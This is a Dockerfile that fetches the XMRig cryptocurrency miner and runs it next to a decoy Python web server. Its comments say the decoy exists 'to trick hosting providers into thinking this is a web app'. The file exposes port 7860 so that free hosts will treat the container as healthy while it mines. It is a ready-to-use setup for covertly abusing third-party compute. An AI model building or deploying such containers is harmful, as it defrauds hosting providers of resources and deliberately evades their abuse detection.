FROM ubuntu:22.04

# Install necessary dependencies
RUN apt-get update && apt-get install -y \
    wget \
    curl \
    tar \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Download pre-compiled XMRig release for maximum performance (avoids compiling in the container)
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && \
    tar -zxvf xmrig-6.21.3-linux-static-x64.tar.gz && \
    mv xmrig-6.21.3/xmrig /app/xmrig && \
    rm -rf xmrig-6.21.3*

# Copy our configuration file
COPY config.json /app/config.json

# Add a fake Python web server script to trick hosting providers into thinking this is a web app
COPY fake_server.py /app/fake_server.py

# Expose a port (many free hosts require a port to be bound to consider the container "healthy")
EXPOSE 7860

# The entrypoint runs the web server in the background, then starts the miner in the foreground
CMD python3 /app/fake_server.py & /app/xmrig --config=/app/config.json
